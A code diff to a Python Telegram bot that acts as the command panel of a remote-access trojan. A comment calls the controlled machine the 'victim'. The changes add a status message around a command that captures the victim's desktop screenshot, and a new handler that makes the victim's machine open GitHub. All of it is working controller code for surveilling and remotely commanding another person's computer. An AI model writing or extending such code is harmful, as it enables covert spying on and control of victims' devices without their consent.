@@ -254,13 +254,17 @@ async def screenshot_main_window_func(callback: CallbackQuery):
     await callback.answer('')
     global client
 
+    response_message = await callback.message.answer('Ожидайте! Фотография рабочего стола отправится в течении нескольких секунд!')
     if client:
         try:
             client.send("screenshot_screen_data".encode())
+            await response_message.delete()
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+            await response_message.delete()
     else:
         await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+        await response_message.delete()
 
 
 # Создает клавиатуры в которой выбираете то что будете делать с экраном жертвы
@@ -477,3 +481,18 @@ async def open_chrome_func(callback: CallbackQuery):
     else:
         await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
 
+
+# Handler для открытия Github
+@router.callback_query(F.data == 'github_data')
+async def open_chrome_func(callback: CallbackQuery):
+    await callback.answer('')
+    global client
+
+    if client:
+        try:
+            await callback.message.answer('Github успешно открыт!')
+            client.send('github'.encode())
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
